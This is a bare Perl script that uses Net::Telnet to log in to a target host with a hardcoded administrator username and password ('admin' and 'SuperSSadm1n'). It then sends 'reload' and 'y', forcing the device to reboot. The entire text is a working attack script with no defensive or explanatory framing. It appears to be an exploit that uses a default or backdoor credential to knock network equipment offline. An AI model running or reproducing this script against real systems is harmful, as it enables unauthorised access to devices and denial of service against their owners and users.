#!/usr/bin/perl
use Net::Telnet ();

$host = $ARGV[0];
$port = $ARGV[1];

$t=new Net::Telnet(Timeout=>20);
$t->open("$host");
$t->put("admin\n");
my $ok=$t->waitfor('/assword:/');
my $ok = 1;
if($ok) {$t->put("SuperSSadm1n\n");}
$t->put("reload\n");
$t->put("y\n");
$t->close;
